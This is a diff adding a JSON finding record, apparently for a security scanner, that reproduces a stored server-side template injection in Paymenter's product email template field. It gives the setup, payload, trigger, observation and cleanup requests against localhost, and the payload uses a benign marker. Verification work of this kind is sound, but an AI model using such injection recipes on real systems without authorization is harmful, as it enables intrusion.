@@ -1,0 +1,66 @@
+{
+  "finding_id": "paymenter-product-email-template-ssti",
+  "type": "ssti.stored",
+  "target": {
+    "expected_origin": "http://127.0.0.1:0",
+    "allowed_hosts": ["127.0.0.1"],
+    "allowed_schemes": ["http"],
+    "allowed_ports": [0]
+  },
+  "auth": {
+    "required": false
+  },
+  "evidence": {
+    "setup_request": {
+      "method": "POST",
+      "url": "http://127.0.0.1:0/admin/products/42",
+      "headers": [
+        {
+          "name": "content-type",
+          "value": "application/x-www-form-urlencoded"
+        }
+      ],
+      "body": "email_template=placeholder"
+    },
+    "injection": {
+      "location": {
+        "kind": "form",
+        "name": "email_template"
+      },
+      "payloads": {
+        "control": "nocapsec-{{ssti_marker}}-literal",
+        "ssti": "{{ {{ssti_marker}} }}"
+      }
+    },
+    "trigger": [
+      {
+        "method": "POST",
+        "url": "http://127.0.0.1:0/admin/services/99/actions/create"
+      }
+    ],
+    "observe": {
+      "method": "GET",
+      "url": "http://127.0.0.1:0/admin/email-logs/latest"
+    }
+  },
+  "proof": {
+    "expected_marker_in_candidate": true,
+    "expected_marker_absent_in_control": true,
+    "repetitions": 2
+  },
+  "side_effects": {
+    "cleanup": [
+      {
+        "method": "POST",
+        "url": "http://127.0.0.1:0/admin/products/42",
+        "headers": [
+          {
+            "name": "content-type",
+            "value": "application/x-www-form-urlencoded"
+          }
+        ],
+        "body": "email_template="
+      }
+    ]
+  }
+}
